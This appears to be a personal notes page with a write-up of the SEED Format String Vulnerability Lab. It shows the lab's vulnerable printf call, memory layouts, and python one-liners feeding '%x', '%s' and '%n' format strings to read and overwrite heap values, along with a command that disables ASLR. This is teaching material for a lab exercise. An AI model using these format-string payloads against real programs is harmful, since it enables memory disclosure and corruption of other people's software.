   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#access-varible">
     Access varible
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#overwrite-varible">
     Overwrite varible
    </a>
   </li>
   <li class="toc-h3 nav-item toc-entry">
    <a class="reference internal nav-link" href="#bit">
     64 bit
    </a>
   </li>
  </ul>
 </li>
 <li class="toc-h2 nav-item toc-entry">
  <a class="reference internal nav-link" href="#lab2">
   Lab2
  </a>
 </li>
</ul>

                        </nav>
                    </div>
                </div>
            </div>
            <main id="main-content" role="main">
                
              <div>
                 <section id="format-string-vulnerability-lab">
<h1>Format String Vulnerability Lab<a class="headerlink" href="#format-string-vulnerability-lab" title="永久链接至标题">#</a></h1>
<p><a class="reference external" href="http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Format_String/">http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Software/Format_String/</a></p>
<section id="lab1">
<h2>Lab1<a class="headerlink" href="#lab1" title="永久链接至标题">#</a></h2>
<p>Files:</p>
<ul class="simple">
<li><p>Makefile</p></li>
<li><p>vul_prog.c</p></li>
</ul>
<section id="summary">
<h3>Summary<a class="headerlink" href="#summary" title="永久链接至标题">#</a></h3>
<p><code class="code docutils literal notranslate"><span class="pre">vul_prog.c</span></code> give a malloced array <code class="code docutils literal notranslate"><span class="pre">secret</span></code> and asked you to get the
value of <code class="code docutils literal notranslate"><span class="pre">scret[1]</span></code> and overwrite it. I can do that when this program
compiled as 32 bits but there still some unsolved problems in 64 bit.</p>
<p><code class="code docutils literal notranslate"><span class="pre">vul_prog.c</span></code> give us the address of <code class="code docutils literal notranslate"><span class="pre">secret</span></code> every times, it means
that ASLR is no longer vaild.</p>
<p>below is the varibles memory layout of vul_prog in my machine:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gcc -m32 -z execstack -fno-stack-protector vul_prog.c -o vul_prog.out
sizeof(int) 4
userinput 0xffc6131c
secret 0xffc61314
int_input 0xffc61310
a 0xffc6130c
b 0xffc61308
c 0xffc61304
d 0xffc6133e
The variable secret&#39;s address is 0xffc61318 (on stack)
The variable secret&#39;s value is 0x 804a410 (on heap)
secret[0]&#39;s address is 0x 804a410 (on heap)
secret[1]&#39;s address is 0x 804a414 (on heap)
Please enter a decimal integer
...
Please enter a string
...
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x55

Doubt: I don&#39;t know why there are 8 bytes between `user_input` and
`int_input`
</pre></div>
</div>
</section>
<section id="access-varible">
<h3>Access varible<a class="headerlink" href="#access-varible" title="永久链接至标题">#</a></h3>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Please enter a decimal integer</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="n">scanf</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%d</span><span class="s2">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">int_input</span><span class="p">);</span>  <span class="o">/*</span> <span class="n">getting</span> <span class="n">an</span> <span class="nb">input</span> <span class="kn">from</span> <span class="nn">user</span> <span class="o">*/</span>
<span class="n">printf</span><span class="p">(</span><span class="s2">&quot;Please enter a string</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
<span class="n">scanf</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">user_input</span><span class="p">);</span> <span class="o">/*</span> <span class="n">getting</span> <span class="n">a</span> <span class="n">string</span> <span class="kn">from</span> <span class="nn">user</span> <span class="o">*/</span>

<span class="o">/*</span> <span class="n">Vulnerable</span> <span class="n">place</span> <span class="o">*/</span>
<span class="n">printf</span><span class="p">(</span><span class="n">user_input</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
</pre></div>
</div>
<p>As you see, <code class="code docutils literal notranslate"><span class="pre">printf</span></code> print a user-input string without any parameter
(IT IS DANGREOUS), we can use it to access varible on stack.</p>
<p>first, find the location of <code class="code docutils literal notranslate"><span class="pre">int_input</span></code>:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ make
$ python -c &quot;print(&#39;57005&#39;); print(&#39;%x-&#39;*20)&quot; | ./vul_prog.out | grep dead
...
ffa49ddc-ffa49dc8-ffa49dc4-ffa49dfe-1-c2-f75b21c3-ffa49dfe-dead-804b010-252d7825- ...
                                                           ^^^^ ^^^^^^^
...

57005 = 0xdead
</pre></div>
</div>
<p>so we can access <code class="code docutils literal notranslate"><span class="pre">int_input</span></code> by input string <code class="code docutils literal notranslate"><span class="pre">'%x'*9</span></code>, and
<code class="code docutils literal notranslate"><span class="pre">secret</span></code> can be accessd by <code class="code docutils literal notranslate"><span class="pre">'%x'*10</span></code>.</p>
<p>How to get the value of <code class="code docutils literal notranslate"><span class="pre">scret[0]</span></code>?</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python -c &quot;print(&#39;57005&#39;); print(&#39;%x-&#39;*9 + &#39;%s&#39;)&quot; | ./vul_prog.out
...
ffd6f1fc-ffd6f1e8-ffd6f1e4-ffd6f21e-1-c2-f76061c3-ffd6f21e-dead-D
                                                                ^
...
</pre></div>
</div>
<p><code class="code docutils literal notranslate"><span class="pre">hex(ord('D'))</span></code> is <code class="code docutils literal notranslate"><span class="pre">0x44</span></code>, the vaule of <code class="code docutils literal notranslate"><span class="pre">secret[0]</span></code>.</p>
<p>How to get the value of <code class="code docutils literal notranslate"><span class="pre">scret[1]</span></code>?</p>
<p>We can control the value of <code class="code docutils literal notranslate"><span class="pre">int_input</span></code>, and we know the address of
<code class="code docutils literal notranslate"><span class="pre">secret[1]</span></code> (from the output of program), more convience, we can close
ASLR so that we don’t need to input the variable address everytime.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ su -c &#39;echo 0 &gt; /proc/sys/kernel/randomize_va_space&#39;

randomize\_va\_space values

1. Disable ASLR. This setting is applied if the kernel is booted
   with the norandmaps boot parameter
2. Randomize the positions of the stack, virtual dynamic shared
   object (VDSO) page, and shared memory regions. The base address
   of the data segment is located immediately after the end of the
   executable code segment
3. Randomize the positions of the stack, VDSO page, shared memory
   regions, and the data segment. This is the default setting.
</pre></div>
</div>
<p>Address of <code class="code docutils literal notranslate"><span class="pre">secret[1]</span></code> is 0x804a414, converts to decimal is 134521876:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python -c &quot;print(&#39;134521876&#39;); print(&#39;%x-&#39;*8 + &#39;%s&#39;)&quot; | ./vul_prog.out
...
ffc6131c-ffc61308-ffc61304-ffc6133e-1-c2-f75921c3-ffc6133e-U
                                                           ^
...
</pre></div>
</div>
<p><code class="code docutils literal notranslate"><span class="pre">hex(ord('U'))</span></code> is <code class="code docutils literal notranslate"><span class="pre">0x55</span></code>, the vaule of <code class="code docutils literal notranslate"><span class="pre">secret[1]</span></code>.</p>
</section>
<section id="overwrite-varible">
<h3>Overwrite varible<a class="headerlink" href="#overwrite-varible" title="永久链接至标题">#</a></h3>
<blockquote>
<div><p>%n: Nothing printed. The corresponding argument must be a pointer to
a signed int. The number of characters written so far is stored in
the pointed location.</p>
</div></blockquote>
<p>Use <code class="code docutils literal notranslate"><span class="pre">%n</span></code> write a vaule to <code class="code docutils literal notranslate"><span class="pre">scret[1]</span></code>:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python -c &quot;print(&#39;134521876&#39;); print(&#39;%x-&#39;*8 + &#39;%n&#39;)&quot; | ./vul_prog.out
...
ff9efafc-ff9efae8-ff9efae4-ff9efb1e-1-c2-f76671c3-ff9efb1e-
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x3b
                              ^^^^
</pre></div>
</div>
<p><code class="code docutils literal notranslate"><span class="pre">secret[1]</span></code> has changed to 0x3b</p>
<p>Write a arbitrary (?) value to <code class="code docutils literal notranslate"><span class="pre">scret[1]</span></code> (by controlling the length
of output string):</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python -c &quot;print(&#39;134521876&#39;); print(&#39;%x-&#39;*8 + &#39;0&#39;*+ &#39;%n&#39;)&quot; | ./vul_prog.out
...
ff868acc-ff868ab8-ff868ab4-ff868aee-1-c2-f762c1c3-ff868aee-00000000000 ...
The original secrets: 0x44 -- 0x55
The new secrets:      0x44 -- 0x233
                              ^^^^^
[1]    3824 done                              python -c &quot;print(&#39;134521876&#39;); print(&#39;%x-&#39;*8 + &#39;0&#39;*504 + &#39;%n&#39;)&quot; |
       3825 segmentation fault (core dumped)  ./vul_prog.out
</pre></div>
</div>
<p>It seem that the value can no smaller then 0x3b, and too large string
will causes segmentation fault. (is it right?)</p>
</section>
<section id="bit">
<h3>64 bit<a class="headerlink" href="#bit" title="永久链接至标题">#</a></h3>
<p>To get a 64bit executable, invoke <code class="code docutils literal notranslate"><span class="pre">make</span> <span class="pre">ARCH=64</span> <span class="pre">vul_prog.out</span></code></p>
<p>Memory layout:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sizeof</span><span class="p">(</span><span class="nb">int</span> <span class="o">*</span><span class="p">):</span> <span class="mi">8</span>
<span class="n">userinput</span> <span class="mh">0x7fffffffe550</span>
<span class="n">secret</span> <span class="mh">0x7fffffffe548</span>
<span class="n">int_input</span> <span class="mh">0x7fffffffe544</span>
<span class="n">a</span> <span class="mh">0x7fffffffe540</span>
<span class="n">b</span> <span class="mh">0x7fffffffe53c</span>
<span class="n">c</span> <span class="mh">0x7fffffffe538</span>
<span class="n">d</span> <span class="mh">0x7fffffffe534</span>
<span class="n">The</span> <span class="n">variable</span> <span class="n">secret</span><span class="s1">&#39;s address is 0xffffe548 (on stack)</span>
<span class="n">The</span> <span class="n">variable</span> <span class="n">secret</span><span class="s1">&#39;s value is 0x  601420 (on heap)</span>
<span class="n">secret</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="s1">&#39;s address is 0x  601420 (on heap)</span>
<span class="n">secret</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="s1">&#39;s address is 0x  601424 (on heap)</span>

<span class="n">NOTE</span><span class="p">:</span> <span class="n">size</span> <span class="n">of</span> <span class="n">x64</span> <span class="n">stack</span> <span class="n">cell</span> <span class="ow">is</span> <span class="mi">8</span> <span class="n">byte</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="nb">int</span><span class="p">)</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="nb">int</span>
\<span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="n">high</span>                <span class="n">low</span>
<span class="o">|-----------------------|</span>
<span class="o">|</span>         <span class="n">secret</span>        <span class="o">|</span>
<span class="o">|-----------------------|</span>
<span class="o">|</span> <span class="n">int_input</span> <span class="o">|</span>     <span class="n">a</span>     <span class="o">|</span>
<span class="o">|-----------------------|</span>
<span class="o">|</span>     <span class="n">b</span>     <span class="o">|</span>     <span class="n">c</span>     <span class="o">|</span>
<span class="o">|-----------------------|</span>
<span class="o">|</span>     <span class="n">d</span>     <span class="o">|</span>           <span class="o">|</span>
<span class="o">|-----------------------|</span>
 <span class="n">low</span>
</pre></div>
</div>
<p>Access <code class="code docutils literal notranslate"><span class="pre">secret[0]</span></code>:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>$ python -c &quot;print(&#39;57005&#39;); print(&#39;%016lx-&#39;*10 + &#39;%s&#39;)&quot; | ./vul_prog.out
...
0000000000000001-00007ffff7dd5770-000000000000000a-0000000000400a30-0000000000000000-\
00007fffffffe6a8-0000000100000000-0000000400000000-0000000200000003-0000dead00000001-D
                                                                        ^^^^         ^
...
</pre></div>
</div>
<p>Overwrite <code class="code docutils literal notranslate"><span class="pre">secret[1]</span></code>: // TODO</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print(&#39;57005&#39;); print(&#39;</span><span class="se">\x24\x14\x60\x60\x00</span><span class="s2">&#39;+ &#39;</span><span class="si">%016lx</span><span class="s2">-&#39; * 12)&quot;</span> <span class="o">|</span> <span class="o">./</span><span class="n">vul_prog</span><span class="o">.</span><span class="n">out</span>
</pre></div>
</div>
</section>
</section>
<section id="lab2">
<h2>Lab2<a class="headerlink" href="#lab2" title="永久链接至标题">#</a></h2>
<p>// TODO</p>
<div class="sd-card sd-sphinx-override sd-mb-3 sd-shadow-sm docutils">
<div class="sd-card-body docutils">
<div class="sd-card-title sd-font-weight-bold docutils">
评论</div>
<p class="sd-card-text">如果你有任何意见，请在此评论。
如果你留下了电子邮箱，我可能会通过 <script type="text/javascript">document.write(
    "<n pynff=\"ersrerapr rkgreany\" uers=\"znvygb:pbzzragf\100fvyireenvam\056zr\">pbzzragf\100fvyireenvam\056zr<\057n>".replace(/[a-zA-Z]/g,
        function(c){
            return String.fromCharCode(
                (c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26
            );
        }
    )
);</script> 回复你。</p>
<section data-isso-id="/notes/writeups/seedlabs/format-string-vulnerability-lab/index" data-title="Format String Vulnerability Lab" id="isso-thread"></section></div>
</div>
</section>
</section>

<div class="section">
   
</div>

              </div>
              
            </main>
            <footer class="footer-article noprint">
                
    <!-- Previous / next buttons -->
<div class='prev-next-area'>
    <a class='left-prev' id="prev-link" href="../index.html" title="上一页 页">
        <i class="fas fa-angle-left"></i>
        <div class="prev-next-info">
            <p class="prev-next-subtitle">上一页</p>
            <p class="prev-next-title">Seed Lab</p>
        </div>
    </a>
    <a class='right-next' id="next-link" href="../../wargame-bandit/index.html" title="下一页 页">
    <div class="prev-next-info">
        <p class="prev-next-subtitle">下一页</p>
        <p class="prev-next-title">wargme-bandit</p>
    </div>
    <i class="fas fa-angle-right"></i>
    </a>
</div>
            </footer>
        </div>
    </div>
    <div class="footer-content row">
        <footer class="col footer"><p>
  
    By Shengyu Zhang<br/>
  
      &copy; Copyright 2020-2022, Shengyu Zhang.<br/>
    Last updated on 2022-08-14.<br/>
</p>
        </footer>
    </div>
    
</div>


      </div>
    </div>
  
  <!-- Scripts loaded after <body> so the DOM is not blocked -->
  <script src="../../../../_static/scripts/pydata-sphinx-theme.js?digest=1999514e3f237ded88cf"></script>


  </body>
</html>